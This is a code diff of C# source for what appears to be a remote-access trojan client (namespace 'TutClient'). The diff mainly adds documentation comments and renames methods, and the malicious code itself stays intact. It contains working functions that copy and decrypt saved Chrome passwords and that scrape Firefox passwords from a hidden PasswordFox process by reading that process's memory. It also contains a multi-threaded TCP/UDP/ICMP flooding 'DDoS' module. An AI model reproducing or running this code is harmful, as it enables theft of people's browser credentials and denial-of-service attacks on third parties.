+        /// </summary>
         public enum ALG_ID
         {
+            /// <summary>
+            /// MD5 Algorithm
+            /// </summary>
             CALG_MD5 = 0x00008003,
+            /// <summary>
+            /// SHA1 Algorithm
+            /// </summary>
             CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1
         }
+
+        /// <summary>
+        /// Hash Parameters
+        /// </summary>
         enum HashParameters
         {
-            HP_ALGID = 0x0001,   // Hash algorithm
-            HP_HASHVAL = 0x0002, // Hash value
-            HP_HASHSIZE = 0x0004 // Hash value size
+            /// <summary>
+            /// Get the algorithm of the hash
+            /// </summary>
+            HP_ALGID = 0x0001,
+            /// <summary>
+            /// Get the value of the hash
+            /// </summary>
+            HP_HASHVAL = 0x0002,
+            /// <summary>
+            /// Get the size of the hash
+            /// </summary>
+            HP_HASHSIZE = 0x0004
         }
 
+        /// <summary>
+        /// Get Crypto Context
+        /// </summary>
+        /// <param name="hProv">Pointer to the crypto handler provider</param>
+        /// <param name="pszContainer">Container</param>
+        /// <param name="pszProvider">Provider</param>
+        /// <param name="dwProvType">The crypto provider type</param>
+        /// <param name="dwFlags">Crypto context flags</param>
+        /// <returns>Result of the acquire</returns>
         [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool CryptAcquireContext(out IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
+        /// <summary>
+        /// Create a hashing provider
+        /// </summary>
+        /// <param name="hProv">Crypto provider</param>
+        /// <param name="algId"><see cref="HashAlgorithm"/> to use</param>
+        /// <param name="hKey">The key to hash with</param>
+        /// <param name="dwFlags">Hashing flags</param>
+        /// <param name="phHash">A pointer the hashing provider output</param>
+        /// <returns>Result of the creation</returns>
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algId, IntPtr hKey, uint dwFlags, ref IntPtr phHash);
+        /// <summary>
+        /// Create a new hash
+        /// </summary>
+        /// <param name="hHash">The hash provider to use</param>
+        /// <param name="pbData">The data to create the hash of</param>
+        /// <param name="dataLen">The length of the data</param>
+        /// <param name="flags">Hashing flags</param>
+        /// <returns>Result of the hash creation</returns>
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint flags);
+        /// <summary>
+        /// Get parameters of a hash
+        /// </summary>
+        /// <param name="hHash">The hashing provider</param>
+        /// <param name="dwParam">The parameter to get</param>
+        /// <param name="pbData">The hash</param>
+        /// <param name="pdwDataLen">The length of the hash</param>
+        /// <param name="dwFlags">Get Parameter flags</param>
+        /// <returns>The result of getting the paramter</returns>
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, [Out] byte[] pbData, ref uint pdwDataLen, uint dwFlags);
+        /// <summary>
+        /// Destroy a hashing provider
+        /// </summary>
+        /// <param name="hHash">The hashing provider to destroy</param>
+        /// <returns>The result of destroying the hash provider</returns>
         [DllImport("advapi32.dll", SetLastError = true)]
         public static extern bool CryptDestroyHash(IntPtr hHash);
+        /// <summary>
+        /// Release a crypto context
+        /// </summary>
+        /// <param name="hProv">The crypto context to release</param>
+        /// <param name="dwFlags">The relase flags</param>
+        /// <returns>The result of the release</returns>
         [DllImport("Advapi32.dll", EntryPoint = "CryptReleaseContext", CharSet = CharSet.Unicode, SetLastError = true)]
         extern static bool CryptReleaseContext(IntPtr hProv, Int32 dwFlags);
 
-        public String[] getGCpw()
+        /// <summary>
+        /// Get Google Chrome Passwords
+        /// </summary>
+        /// <returns>An array of goolge chrome stored passwords</returns>
+        public String[] GetGCpw()
         {
-            String file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
-            if (File.Exists(Application.StartupPath + "\\logindata")) File.Delete(Application.StartupPath + "\\logindata");
-            if (!File.Exists(file))
+            String file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data"; //The password file's path
+            if (File.Exists(Application.StartupPath + "\\logindata")) File.Delete(Application.StartupPath + "\\logindata"); //Remove local copy
+            if (!File.Exists(file)) //Check if the password file exists
             {
-                return new String[] { "failed" };
+                return new String[] { "failed" }; //If not we failed decryption
             }
-            File.Copy(file, System.Windows.Forms.Application.StartupPath + "\\logindata");
-            List<String> gcLogin = new List<String>();
-            String sql = "SELECT username_value, password_value, origin_url FROM logins WHERE blacklisted_by_user = 0";
-            using (SQLiteConnection c = new SQLiteConnection("Data Source=logindata;Version=3;"))
+            File.Copy(file, Application.StartupPath + "\\logindata"); //Copy the file to our folder (to prevent SQL blocking our SELECT)
+            List<String> gcLogin = new List<String>(); //Store the results here
+            String sql = "SELECT username_value, password_value, origin_url FROM logins WHERE blacklisted_by_user = 0"; //SQL Query for passwords
+            using (SQLiteConnection c = new SQLiteConnection("Data Source=logindata;Version=3;")) //Connect to the database
             {
-                c.Open();
-                using (SQLiteCommand cmd = new SQLiteCommand(sql, c))
+                c.Open(); //Open the connection
+                using (SQLiteCommand cmd = new SQLiteCommand(sql, c)) //Execute the command
                 {
-                    using (SQLiteDataReader r = cmd.ExecuteReader())
+                    using (SQLiteDataReader r = cmd.ExecuteReader()) //Read the command results
                     {
-                        while (r.Read())
+                        while (r.Read()) //Read the results
                         {
-                            String username = Convert.ToString(r["username_value"]);
-                            var passwordBuffer = (Byte[])r.GetValue(1);
-                            String password = decryptGCpassword(passwordBuffer);
-                            String url = Convert.ToString(r["origin_url"]);
-                            String dataString = url + "§" + username + "§" + password;
-                            gcLogin.Add(dataString);
+                            String username = Convert.ToString(r["username_value"]); //Get the username
+                            var passwordBuffer = (Byte[])r.GetValue(1); //Get the buffer of password
+                            String password = DecryptGCpassword(passwordBuffer); //Decrypt the password
+                            String url = Convert.ToString(r["origin_url"]); //Get the URL
+                            String dataString = url + "§" + username + "§" + password; //Craft data string
+                            gcLogin.Add(dataString); //Append to result
                         }
                     }
                 }
             }
 
-            if (gcLogin.Count == 0)
+            if (gcLogin.Count == 0) //No passwords
             {
-                gcLogin.Add("failed");
+                gcLogin.Add("failed"); //Failed to decrypt
             }
 
-            return gcLogin.ToArray();
+            return gcLogin.ToArray(); //Return passwords
         }
 
-        public String decryptGCpassword(byte[] blob)
+        /// <summary>
+        /// Decrypt a google chrome password
+        /// </summary>
+        /// <param name="blob">The data to decrypt</param>
+        /// <returns>The plain text password</returns>
+        public String DecryptGCpassword(byte[] blob)
         {
-            byte[] decrypted = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
-            return Encoding.UTF8.GetString(decrypted);
+            byte[] decrypted = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser); //Decrypt the data
+            return Encoding.UTF8.GetString(decrypted); //Decode and return the data
         }
 
-        private bool isFFinstalled()
+        /// <summary>
+        /// Check if firefox is installed
+        /// </summary>
+        /// <returns>True if firefox is installed, otherwise false</returns>
+        private bool IsFFinstalled()
         {
-            String regKey = "SOFTWARE\\Mozilla\\Mozilla Firefox";
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(regKey);
-            if (key == null) return false;
-            return true;
+            String regKey = "SOFTWARE\\Mozilla\\Mozilla Firefox"; //FireFox registry key
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(regKey); //Open the key
+            if (key == null) return false; //Key failed to open -> not installed
+            return true; //Open success -> installed
         }
 
-        public String[] getFFpw()
+        /// <summary>
+        /// Get firefox passwords
+        /// </summary>
+        /// <returns>An array of firefox passwords</returns>
+        public String[] GetFFpw()
         {
-            if (!isFFinstalled()) return new String[] { "failed" };
-            String location = "ff.exe";
-            int fflvOffset = 2;
-            ProcessStartInfo info = new ProcessStartInfo();
-            Process p = new Process();
-            info.WindowStyle = ProcessWindowStyle.Hidden;
+            if (!IsFFinstalled()) return new String[] { "failed" }; //If FF isn't installed we failed decryption
+            String location = "ff.exe"; //Decryptor location
+            int fflvOffset = 2; //The passwords listView control index
+            //Start decryptor process
+            ProcessStartInfo info = new ProcessStartInfo
+            {
+                WindowStyle = ProcessWindowStyle.Hidden,
+                FileName = location
+            };
 
-            info.FileName = location;
-            p.StartInfo = info;
+            Process p = new Process
+            {
+                StartInfo = info
+            };
+
             p.Start();
             Thread.Sleep(3000);
-            vTest = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "PasswordFox", null);//FindWindow(null, p.MainWindowTitle);
+            vTest = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "PasswordFox", null); //Find the decryptor's window
             Console.WriteLine(vTest.ToString("X"));
-            //MessageBox.Show("Main Window Handle: " + vTest.ToString());
-            listView = enumWindows(vTest, fflvOffset);
-            //MessageBox.Show("ListView Handle: " + listView.ToString("X"));
-            int items = getItemsCount(listView);
-            //MessageBox.Show("Items in listView: " + items);
-            List<String> lvItems = new List<String>();
-            if (items == 0)
+            listView = EnumWindows(vTest, fflvOffset); //Get the listView of the decryptor
+            int items = GetItemsCount(listView); //Get the count of the listView's items
+            List<String> lvItems = new List<String>(); //List of passwords
+            if (items == 0) //No passwords saved
             {
-                p.Kill();
-                return new String[] { "failed" };
+                p.Kill(); //Stop the decryptor
+                return new String[] { "failed" }; //We failed decryption
             }
-            //MessageBox.Show("Getting Passwords");
+
             for (int i = 0; i < items; i++)
             {
-                String currentItem = "";
-                for (int t = 0; t < ffprColumn; t++)
+                String currentItem = ""; //Name of the current item
+                for (int t = 0; t < ffprColumn; t++) //Loop through the count of the columns
                 {
-                    String currentSubitem = getSubItem(t, i, "ff");
-                    if (t + 1 !=  ffprColumn)
+                    String currentSubitem = GetSubItem(t, i, "ff"); //Get the subitem of this column
+                    if (t + 1 != ffprColumn) //If next column isn't out of bounds
                     {
-                        currentSubitem += "§";
+                        currentSubitem += "§"; //Add data delimiter
                     }
 
-                    currentItem += currentSubitem;
+                    currentItem += currentSubitem; //Add the subitem to the item string
                 }
 
-                lvItems.Add(currentItem);
+                lvItems.Add(currentItem); //Add the current item to the item list
             }
 
-            p.Kill();
+            p.Kill(); //Kill the decryptor
 
-            return lvItems.ToArray();
+            return lvItems.ToArray(); //Return the list of items
         }
 
-        private int getItemsCount(IntPtr lvHandle)
+        /// <summary>
+        /// Get the items of a <see cref="ListView"/>
+        /// </summary>
+        /// <param name="lvHandle">The handle of the <see cref="ListView"/></param>
+        /// <returns>The number of items in the <see cref="ListView"/></returns>
+        private int GetItemsCount(IntPtr lvHandle)
         {
-            IntPtr result = SendMessageA(lvHandle, LVM_GETITEMCOUNT, IntPtr.Zero, IntPtr.Zero);
-            return result.ToInt32();
+            IntPtr result = SendMessageA(lvHandle, LVM_GETITEMCOUNT, IntPtr.Zero, IntPtr.Zero); //Send the query message
+            return result.ToInt32(); //Return the number of items in the listView
         }
 
-        private String getSubItem(int subitem, int item, String processName)
+        /// <summary>
+        /// Get a subitem of an item in a <see cref="ListView"/>
+        /// </summary>
+        /// <param name="subitem">The ID of the subitem to get</param>
+        /// <param name="item">The ID of the item to get the subitems of</param>
+        /// <param name="processName">The name of the exectuing process</param>
+        /// <returns>The text of the subitem</returns>
+        private String GetSubItem(int subitem, int item, String processName)
         {
-            IntPtr extractBufferLength = (IntPtr)512;
-            int procID = Process.GetProcessesByName(processName)[0].Id;
-            //MessageBox.Show("Process id: " + procID + " | " + subitem + " | " + item);
+            IntPtr extractBufferLength = (IntPtr)512; //Size of the text buffer
+            int procID = Process.GetProcessesByName(processName)[0].Id; //Get the ID of the process
+            //Get the handle of the process
             IntPtr pHandle = OpenProcess(ProcessAccessFlags.VirtualMemoryOperation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite, false, procID);
+            //Allocate the textbuffer in the process
             IntPtr pExtractBuffer = VirtualAllocEx(pHandle, (IntPtr)0, extractBufferLength, AllocationType.Commit, MemoryProtection.ReadWrite);
-            //MessageBox.Show(pExtractBuffer.ToString());
-            LVITEM lvi = new LVITEM();
-            lvi.mask = LVIF_TEXT;
-            lvi.cchTextMax = extractBufferLength.ToInt32();
-            lvi.iSubItem = subitem;
-            lvi.pszText = pExtractBuffer;
+            LVITEM lvi = new LVITEM
+            {
+                mask = LVIF_TEXT,
+                cchTextMax = extractBufferLength.ToInt32(),
+                iSubItem = subitem,
+                pszText = pExtractBuffer
+            }; //Create the listView item object
+            //Allocate memory for the listView item object
             IntPtr pStructBuffer = VirtualAllocEx(pHandle, (IntPtr)0, (IntPtr)Marshal.SizeOf(lvi), AllocationType.Commit, MemoryProtection.ReadWrite);
-            byte[] data = getBytes(lvi);
-            WriteStructureToProcessMemory(pHandle, pStructBuffer, lvi);
-            IntPtr length = SendMessageA(listView, LVM_GETITEM, (IntPtr)item, pStructBuffer);
-            byte[] retBuffer = new byte[length.ToInt32() * 2];
+            WriteStructureToProcessMemory(pHandle, pStructBuffer, lvi); //Write the listViewItem object to the remote process memory
+            IntPtr length = SendMessageA(listView, LVM_GETITEM, (IntPtr)item, pStructBuffer); //Send message to the remote window
+            byte[] retBuffer = new byte[length.ToInt32() * 2]; //Create a buffer for the results
             IntPtr bytesRead = IntPtr.Zero;
-            ReadProcessMemory(pHandle, pExtractBuffer, retBuffer, length.ToInt32() * 2, out bytesRead);
-            String subItemText = Encoding.Unicode.GetString(retBuffer);
-            //MessageBox.Show(Encoding.Unicode.GetString(retBuffer));
-            VirtualFreeEx(pHandle, pExtractBuffer, 0, FreeType.Release);
-            VirtualFreeEx(pHandle, pStructBuffer, 0, FreeType.Release);
-            CloseHandle(pHandle);
-            return subItemText;
+            ReadProcessMemory(pHandle, pExtractBuffer, retBuffer, length.ToInt32() * 2, out bytesRead); //Read the subitem's text from the remote process memory
+            String subItemText = Encoding.Unicode.GetString(retBuffer); //Get the text of the subitem
+            VirtualFreeEx(pHandle, pExtractBuffer, 0, FreeType.Release); //Free the text buffer from the memory
+            VirtualFreeEx(pHandle, pStructBuffer, 0, FreeType.Release); //Free the remote structure buffer
+            CloseHandle(pHandle); //Close the process handle
+            return subItemText; //Return the text of the subitem
         }
 
+        /// <summary>
+        /// Write a struct to process memory
+        /// </summary>
+        /// <param name="processHandle">The handle of the remote <see cref="Process"/></param>
+        /// <param name="BaseAddress">The address to write the struct to</param>
+        /// <param name="obj">The struct to write</param>
         private void WriteStructureToProcessMemory(IntPtr processHandle, IntPtr BaseAddress, LVITEM obj)
         {
-            UInt32 sizeOfLVITEM = (UInt32)Marshal.SizeOf(typeof(LVITEM));
-            IntPtr ptrToLvItem = Marshal.AllocHGlobal((int)sizeOfLVITEM);
-            Marshal.StructureToPtr(obj, ptrToLvItem, true);
+            UInt32 sizeOfLVITEM = (UInt32)Marshal.SizeOf(typeof(LVITEM)); //Get the size of the struct
+            IntPtr ptrToLvItem = Marshal.AllocHGlobal((int)sizeOfLVITEM); //Allocate space for struct bytes
+            Marshal.StructureToPtr(obj, ptrToLvItem, true); //Load struct bytes to local memory
 
-            WriteProcessMemory(processHandle, BaseAddress, ptrToLvItem, sizeOfLVITEM, UIntPtr.Zero);
+            WriteProcessMemory(processHandle, BaseAddress, ptrToLvItem, sizeOfLVITEM, UIntPtr.Zero); //Write data to remote process memory
         }
 
-        private byte[] getBytes(LVITEM str)
+        /// <summary>
+        /// Get the byte array form of a struct
+        /// </summary>
+        /// <param name="str">The struct to convert</param>
+        /// <returns>The <see cref="byte[]"/> representation of the struct</returns>
+        private byte[] GetBytes(LVITEM str)
         {
-            int size = Marshal.SizeOf(str);
-            byte[] arr = new byte[size];
+            int size = Marshal.SizeOf(str); //Get the size of the struct
+            byte[] arr = new byte[size]; //Create the buffer for the result
 
-            IntPtr ptr = Marshal.AllocHGlobal(size);
-            Marshal.StructureToPtr(str, ptr, true);
-            Marshal.Copy(ptr, arr, 0, size);
-            Marshal.FreeHGlobal(ptr);
-            return arr;
+            IntPtr ptr = Marshal.AllocHGlobal(size); //Alocate space for the data
+            Marshal.StructureToPtr(str, ptr, true); //Create a pointer to the structure
+            Marshal.Copy(ptr, arr, 0, size); //Copy the structure to the result
+            Marshal.FreeHGlobal(ptr); //Free the structure pointer
+            return arr; //Return the result
         }
 
-        private IntPtr enumWindows(IntPtr mainHandle, int lvLocation)
+        /// <summary>
+        /// Loop through the given number of child windows
+        /// </summary>
+        /// <param name="mainHandle">The parent windows handle</param>
+        /// <param name="lvLocation">The number of childs to loop thorugh</param>
+        /// <returns>A handle to the resulting child window</returns>
+        private IntPtr EnumWindows(IntPtr mainHandle, int lvLocation)
         {
-            IntPtr lvPtr = IntPtr.Zero;
-            IntPtr prevPtr = IntPtr.Zero;
-            int enumPos = 0;
+            IntPtr lvPtr = IntPtr.Zero; //Result pointer
+            IntPtr prevPtr = IntPtr.Zero; //Pointer to the previous window
+            int enumPos = 0; //Index for looping
 
             while (true)
             {
-                if (enumPos == 0)
+                if (enumPos == 0) //First loop
                 {
-                    prevPtr = FindWindowEx(mainHandle, (IntPtr)0, null, null);
+                    prevPtr = FindWindowEx(mainHandle, (IntPtr)0, null, null); //Get the first child of the parent
                 }
-                else
+                else //Not first loop
                 {
-                    prevPtr = FindWindowEx(mainHandle, prevPtr, null, null);
+                    prevPtr = FindWindowEx(mainHandle, prevPtr, null, null); //Get the child after the current child
                 }
                 Console.WriteLine("Aquired Handle: " + prevPtr.ToString("X"));
-                if (enumPos == lvLocation) break;
+                if (enumPos == lvLocation) break; //If indexes match break out
 
-                enumPos++;
+                enumPos++; //Increment the index
             }
 
-            lvPtr = prevPtr;
+            lvPtr = prevPtr; //Set the result
 
-            return lvPtr;
+            return lvPtr; //Return the result
         }
     }
 
-    public class ddos
+    /// <summary>
+    /// The DDoS Module
+    /// </summary>
+    public class DDoS
     {
+        /// <summary>
+        /// The IP address to attack
+        /// </summary>
         private String ip = "";
+        /// <summary>
+        /// The port to attack on
+        /// </summary>
         private int port = 0;
+        /// <summary>
+        /// The protocol to use
+        /// </summary>
         private int prot = 0;
+        /// <summary>
+        /// The packet size to send
+        /// </summary>
         private int packetSize = 0;
+        /// <summary>
+        /// The number of <see cref="Thread"/>s to attack with
+        /// </summary>
         private int Threads = 0;
+        /// <summary>
+        /// The delay to wait between packet sends
+        /// </summary>
         private int delay = 0;
+        /// <summary>
+        /// TCP Protocol ID
+        /// </summary>
         private const int protocol_tcp = 0;
+        /// <summary>
+        /// UDP Protocol ID
+        /// </summary>
         private const int protocol_udp = 1;
+        /// <summary>
+        /// ICMP Protocol ID
+        /// </summary>
         private const int protocol_icmp = 2;
+        /// <summary>
+        /// DDoSing Thread
+        /// </summary>
         Thread t_ddos;
+        /// <summary>
+        /// DDoS Kill Switch
+        /// </summary>
         bool kill = false;
 
-        public ddos(String cIp, String cPort, String cProtocol, String cPacketSize, String cThreads, String cDelay)
+        /// <summary>
+        /// Create a new DDoS Attack
+        /// </summary>
+        /// <param name="cIp">The IP To Attack</param>
+        /// <param name="cPort">The port to attack on</param>
+        /// <param name="cProtocol">The protocol to use</param>
+        /// <param name="cPacketSize">The packet size to send</param>
+        /// <param name="cThreads">The number of threads to attack with</param>
+        /// <param name="cDelay">The delay between packet sends</param>
+        public DDoS(String cIp, String cPort, String cProtocol, String cPacketSize, String cThreads, String cDelay)
         {
+            //Set all DDoS variables
             ip = cIp;
             port = int.Parse(cPort);
             switch (cProtocol)
@@ -2652,21 +3544,30 @@ namespace TutClient
             delay = int.Parse(cDelay);
         }
 
-        public void startDdos()
+        /// <summary>
+        /// Start the attack
+        /// </summary>
+        public void StartDdos()
         {
-            t_ddos = new Thread(new ThreadStart(ddosTarget));
+            //Create the thread and start attacking
+            t_ddos = new Thread(new ThreadStart(DDoSTarget));
             t_ddos.Start();
         }
 
-        private void ddosTarget()
+        /// <summary>
+        /// Main Attacking Thread
+        /// </summary>
+        private void DDoSTarget()
         {
-            List<Thread> subThreads = new List<Thread>();
+            List<Thread> subThreads = new List<Thread>(); //List of sub threads
+
+            //Determine the protocol, create threads and start attacking
 
             if (prot == protocol_tcp)
             {
                 for (int i = 0; i < Threads; i++)
                 {
-                    Thread t = new Thread(new ThreadStart(ddosTcp));
+                    Thread t = new Thread(new ThreadStart(DDoSTcp));
                     t.Start();
                     subThreads.Add(t);
                 }
@@ -2676,7 +3577,7 @@ namespace TutClient
             {
                 for (int i = 0; i < Threads; i++)
                 {
-                    Thread t = new Thread(new ThreadStart(ddosUdp));
+                    Thread t = new Thread(new ThreadStart(DDoSUdp));
                     t.Start();
                     subThreads.Add(t);
                 }
@@ -2686,7 +3587,7 @@ namespace TutClient
             {
                 for (int i = 0; i < Threads; i++)
                 {
-                    Thread t = new Thread(new ThreadStart(ddosIcmp));
+                    Thread t = new Thread(new ThreadStart(DDoSIcmp));
                     t.Start();
                     subThreads.Add(t);
                 }
@@ -2701,17 +3602,20 @@ namespace TutClient
             t_ddos.Abort();
         }
 
-        private void ddosIcmp()
+        /// <summary>
+        /// DDoS Using Icmp
+        /// </summary>
+        private void DDoSIcmp()
         {
             while (true)
             {
                 if (kill) break;
                 try
                 {
-                    System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
-                    byte[] junk = Encoding.Unicode.GetBytes(generateData());
-                    ping.Send(ip, 1000, junk);
-                    Thread.Sleep(delay);
+                    System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping(); //Create a new ping request
+                    byte[] junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
+                    ping.Send(ip, 1000, junk); //Send the ping to the target
+                    Thread.Sleep(delay); //Wait if delay is set
                 }
                 catch (Exception ex)
                 {
@@ -2720,7 +3624,10 @@ namespace TutClient
             }
         }
 
-        private void ddosUdp()
+        /// <summary>
+        /// DDoS Using Udp
+        /// </summary>
+        private void DDoSUdp()
         {
             while (true)
             {
@@ -2728,12 +3635,12 @@ namespace TutClient
 
                 try
                 {
-                    UdpClient client = new UdpClient();
-                    client.Connect(ip, port);
-                    byte[] junk = Encoding.Unicode.GetBytes(generateData());
-                    client.Send(junk, junk.Length);
-                    client.Close();
-                    Thread.Sleep(delay);
+                    UdpClient client = new UdpClient(); //Create a UDP Client
+                    client.Connect(ip, port); //Connect to the server
+                    byte[] junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
+                    client.Send(junk, junk.Length); //Send the data to the server
+                    client.Close(); //Close the connection
+                    Thread.Sleep(delay); //Wait if delay is set
                 }
                 catch (Exception ex)
                 {
@@ -2742,7 +3649,10 @@ namespace TutClient
             }
         }
 
-        private void ddosTcp()
+        /// <summary>
+        /// DDoS Using Tcp
+        /// </summary>
+        private void DDoSTcp()
         {
             while(true)
             {
@@ -2750,15 +3660,16 @@ namespace TutClient
 
                 try
                 {
-                    TcpClient client = new TcpClient();
-                    client.Connect(ip, port);
-                    NetworkStream ns = client.GetStream();
-                    byte[] junk = Encoding.Unicode.GetBytes(generateData());
-                    ns.Write(junk, 0, junk.Length);
+                    TcpClient client = new TcpClient(); //Create a new client
+                    client.Connect(ip, port); //Connect to the server
+                    NetworkStream ns = client.GetStream(); //Get the stream of the server
+                    byte[] junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
+                    ns.Write(junk, 0, junk.Length); //Send data to server
+                    //Shutdown the connection
                     ns.Close();
                     ns.Dispose();
                     client.Close();
-                    Thread.Sleep(delay);
+                    Thread.Sleep(delay); //Wait if delay is set
                 }
                 catch (Exception ex)
                 {
@@ -2767,21 +3678,28 @@ namespace TutClient
             }
         }
 
-        private String generateData()
+        /// <summary>
+        /// Generate random random with the size given in packetSize
+        /// </summary>
+        /// <returns>Random string data</returns>
+        private String GenerateData()
         {
-            String data = "";
+            String data = ""; //The data variable
 
             for (int i = 0; i < packetSize; i++ )
             {
-                data += "A";
+                data += "A"; //Append char to the data
             }
 
-            return data;
+            return data; //Return the data
         }
 
-        public void stopDdos()
+        /// <summary>
+        /// Stop DDoSing target
+        /// </summary>
+        public void StopDDoS()
         {
-            kill = true;
+            kill = true; //Set the kill switch
         }
     }
 }
